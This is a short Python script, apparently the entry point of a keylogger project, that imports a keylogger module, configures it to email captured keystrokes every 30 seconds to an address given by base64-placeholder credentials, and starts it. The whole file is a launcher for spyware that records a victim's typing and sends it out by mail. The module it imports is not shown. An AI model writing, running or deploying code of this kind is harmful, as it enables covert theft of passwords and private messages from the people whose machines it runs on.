import keylogger

# 30 this indicates how many seconds the notification will be sent by
# mail, you can to change it :D 
keylogger = keylogger.Keylogger(30, '<base64-email>', '<base64-pass>')
keylogger.start()
